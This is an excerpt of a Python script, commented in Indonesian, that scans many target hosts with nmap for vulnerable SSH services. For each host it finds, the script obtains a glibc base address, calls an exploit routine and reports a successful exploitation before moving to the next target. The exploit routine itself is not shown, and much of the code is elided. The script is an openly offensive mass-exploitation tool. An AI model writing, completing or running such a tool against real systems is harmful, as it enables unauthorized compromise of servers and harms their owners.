...
# MODIFIKASI BARU: Kelas ProgressIndicator diubah total menjadi bar hitung mundur
class ProgressIndicator:
    ...
    def _draw_bar(self):
        bar_width = 30 # Lebar bar dalam karakter
    ...
    def stop(self):
        ...
        self._thread.join()
        # Bersihkan baris progress setelah selesai
        sys.stdout.write("\r" + " " * (len(self._message) + 50) + "\r")
        sys.stdout.flush()

def find_vulnerable_ssh_services(target_ip):
    """
    Memindai port menggunakan nmap -sV dan menampilkan bar hitung mundur.
    """
    nmap_timeout = 180  # Durasi timeout untuk nmap dalam detik
    message = f"{BLUE}[*] Menjalankan Nmap Service Scan pada {target_ip}...{RESET}"
    
    # Inisialisasi ProgressIndicator dengan durasi timeout
    progress = ProgressIndicator(message, timeout=nmap_timeout)
    
    found_vulnerable_services = []
    try:
        command = ["nmap", "-sV", "--top-ports", "1000", "-Pn", "-T4", "--open", target_ip]
        ...
        if not service_matches:
            print(f"{RED}[-] Tidak ditemukan layanan SSH terbuka pada 1000 port teratas.{RESET}")
            return []

        print(f"{GREEN}[+] Nmap selesai. Ditemukan {len(service_matches)} layanan SSH terbuka. Memverifikasi versi...{RESET}")
        ...
        progress.stop()
        print(f"\n{RED}Nmap timeout setelah {nmap_timeout} detik saat memindai {target_ip}{RESET}")
        return []
...
def main():
    ...
    print(f"{BLUE}[*] Menyiapkan pemindaian untuk {len(targets_to_scan)} host...{RESET}")
    ...
    for i, target_ip in enumerate(targets_to_scan):
        ...
        if not vulnerable_services:
            print(f"{YELLOW}[-] Tidak ada layanan SSH rentan yang ditemukan pada {target_ip}. Lanjut ke target berikutnya.{RESET}")
            continue
        ...
        for port, banner in vulnerable_services:
            ...
            if glibc_base:
                ...
                if run_exploit(target_ip, port, glibc_base):
                    ...
                    print(f"{GREEN}[+] Host {target_ip} berhasil dieksploitasi. Lanjut ke target IP berikutnya.{RESET}")
                    break
            else:
